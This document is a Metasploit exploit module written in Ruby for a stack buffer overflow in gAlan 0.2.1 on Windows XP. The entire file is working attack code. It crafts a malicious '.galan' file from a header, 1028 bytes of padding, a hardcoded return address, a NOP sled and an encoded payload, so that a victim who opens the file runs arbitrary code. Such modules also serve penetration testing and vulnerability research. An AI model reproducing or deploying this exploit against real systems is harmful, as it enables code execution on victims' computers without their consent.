require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        include Msf::Exploit::FILEFORMAT

        def initialize(info = {})
                super(update_info(info,
                        'Name' => 'gAlan 0.2.1 Buffer Overflow Exploit',
                        'Description' => %q{     
					This module exploits a stack overflow in gAlan 0.2.1
                         By creating a specially crafted galan file, an an attacker may be able
                         to execute arbitrary code.
			},
                        'License' => MSF_LICENSE,
                        'Author' => [ 'loneferret, original by Jeremy Brown' ],
                        'Version' => '$Revision: 7724 $',
                        'References' =>
                                [
                                        [ 'URL', 'http://www.exploit-db.com/exploits/10339' ],
                                ],
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'process',
                                },
                        'Payload' =>
                                {
                                        'Space' => 1000,
                                        'BadChars' => "\x00\x0a\x0d\x20\x0c\x0b\x09",
                                        'StackAdjustment' => -3500,
                                },
                        'Platform' => 'win',
                        'Targets' =>
                                [
					[ 'Windows XP Universal', { 'Ret' => 0x100175D0} ], 		# 0x100175D0 call esi @ glib-1_3
                                ],
                        'Privileged' => false,
                        'DisclosureDate' => 'Dec 07 2009',
                        'DefaultTarget' => 0))
                        register_options(
                                [
                                        OptString.new('FILENAME', [ false, 'The file name.', 'evil.galan']),
                                ], self.class)
        end
        def exploit
                sploit = "Mjik"
                sploit << rand_text_alpha_upper(1028)
                sploit << [target.ret].pack('V')
                sploit << "\x90" * 45
                sploit << payload.encoded

                galan = sploit
                print_status("Creating '#{datastore['FILENAME']}' file ...")
                file_create(galan)
        end
end
